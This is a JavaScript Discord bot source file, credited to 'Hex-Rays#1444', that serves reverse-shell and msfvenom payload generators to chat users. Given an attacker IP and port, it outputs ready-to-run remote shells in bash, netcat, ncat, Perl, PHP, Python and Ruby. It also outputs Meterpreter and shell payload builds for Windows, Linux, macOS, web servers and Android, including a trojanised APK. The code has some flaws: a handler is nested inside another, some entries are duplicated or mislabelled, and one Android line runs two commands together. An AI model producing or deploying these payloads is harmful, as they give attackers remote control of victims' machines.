const Discord = require("discord.js");
const Client = new Discord.Client();
const prefix = "-";
Client.on('ready', ()=>{
    Client.user.setActivity('C99 Shells', { type: 'WATCHING'}).catch(console.error);
})
Client.on('message', message=>{
    if(message.content.startsWith(prefix + "help")) {
        let ipEmbed = new Discord.MessageEmbed()
        .setColor("#000000")
        .setAuthor("Reverse Shell Generator - Hex-Rays#1444")
        .setThumbnail('https://automatedprogrammer.sh/wp-content/uploads/2018/05/cropped-Linux-Shell-300x300.png')
        .setTitle("Help Menu")
        .addField(prefix + "Generate", "• Generates Reverse Shells in muliuple lanaugues",  true) 
        .addField(prefix + "MSFVenom", "• MSFVenom Payload Generator",  true) 
        .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
        message.channel.send(ipEmbed)
    }
})
Client.on('message', async message => {
    if(message.content.startsWith(prefix + "Generate")) {

        var split = message.content.split(' ');
        var ip = split[1];
        var port = split[2];
      let Generaiton = new Discord.MessageEmbed()
      .setColor("#000000")
      .setAuthor("Reverse Shell Generator - Programmed By Hex-Rays#1444")
      .addField("• Bash -i", `sh -i >& /dev/tcp/${ip}/${port} 0>&1`, true) 
      .addField("• nc -e ", `nc -e sh ${ip} ${port}`, true) 
      .addField("• nc -c ", `nc -c sh ${ip} ${port}`, true) 
      .addField("• ncat -e ", `ncat ${ip} ${port} -e sh`, true) 
      .addField("• ncat.exe -e ", `ncat.exe ${ip} ${port} -e sh`, true) 
      .addField("• ncat udp ", `ncat ${ip} ${port} -e sh`, true) 
      .addField("• ncat udp ", `ncat ${ip} ${port} -e sh`, true) 
      .addField("• Perl ", `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`, true) 
      .addField("• PHP Exec ", `php -r '$sock=fsockopen("${ip}",${port});exec("sh <&3 >&3 2>&3");'`, true) 
      .addField("• PHP shell_exec ", `php -r '$sock=fsockopen("${ip}",${port});shell_exec("sh <&3 >&3 2>&3");'`, true) 
      .addField("• PHP system ", `php -r '$sock=fsockopen("${ip}",${port});system("sh <&3 >&3 2>&3");'`, true) 
      .addField("• Python ", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`, true) 
      .addField("• Python3 ", `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`, true) 
      .addField("• Ruby ", `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("sh -i <&%d >&%d 2>&%d",f,f,f)'`, true) 
      .setThumbnail('https://automatedprogrammer.sh/wp-content/uploads/2018/05/cropped-Linux-Shell-300x300.png')

      .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
      message.channel.send(Generaiton)
    }
    Client.on('message', async message => {
        if(message.content.startsWith(prefix + "MSFVenom")) {
            var split = message.content.split(' ');
            var ip = split[1];
            var port = split[2];
            
          let MSFVenomGeneraiton = new Discord.MessageEmbed()
          .setColor("#000000")
          .setAuthor("MSFVenom Payload Generator - Programmed By Hex-Rays#1444")
          .addField("• Windows Meterpreter Staged Reverse TCP (x64)", `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o reverse.exe`, true) 
          .addField("• Windows Meterpreter Staged Reverse TCP (x64)", `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o reverse.exe`, true) 
          .addField("• Windows Staged Reverse TCP (x64)", `msfvenom -p windows/x64/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o reverse.exe`, true) 
          .addField("• Windows Stageless Reverse TCP (x64)", `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o reverse.exe`, true) 
          .addField("• Linux Meterpreter Staged Reverse TCP (x64)", `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o reverse.elf`, true) 
          .addField("• Linux Stageless Reverse TCP (x64)", `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o reverse.elf`, true) 
          .addField("• macOS Meterpreter Staged Reverse TCP (x64)", `msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f macho -o shell.macho`, true) 
          .addField("• macOS Meterpreter Stageless Reverse TCP (x64)", `msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f macho -o shell.macho`, true) 
          .addField("• macOS Stageless Reverse TCP (x64)", `msfvenom -p osx/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f macho -o shell.macho`, true) 
          .addField("• PHP Meterpreter Stageless Reverse TCP", `msfvenom -p php/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f raw -o shell.php`, true) 
          .addField("• PHP Reverse PHP", `msfvenom -p php/reverse_php LHOST=${ip} LPORT=${port} -o shell.php`, true) 
          .addField("• JSP Stageless Reverse TCP", `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip} LPORT=${port} -f raw -o shell.jsp`, true) 
          .addField("• WAR Stageless Reverse TCP", `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip} LPORT=${port} -f war -o shell.war`, true) 
          .addField("• Android Meterpreter Reverse TCP", `msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=${ip} lport=${port} R -o malicious.apk`, true) 
          .addField("• Android Meterpreter Embed Reverse TCP", `msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost=${ip} lport=${port} -o payload.apkmsfvenom --platform android -p android/meterpreter/reverse_tcp lhost=${ip} lport=${port} R -o malicious.apk`, true) 
          .addField("• Python Stageless Reverse TCP", `msfvenom -p cmd/unix/reverse_python LHOST=${ip} LPORT=${port} -f raw -o shell.py`, true) 
          .addField("• Bash Stageless Reverse TCP", `msfvenom -p cmd/unix/reverse_bash LHOST=${ip} LPORT=${port} -f raw -o shell.sh`, true) 

          .setThumbnail('https://automatedprogrammer.sh/wp-content/uploads/2018/05/cropped-Linux-Shell-300x300.png')
          .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
          message.channel.send(MSFVenomGeneraiton)
        }
        });  
})
Client.login("")
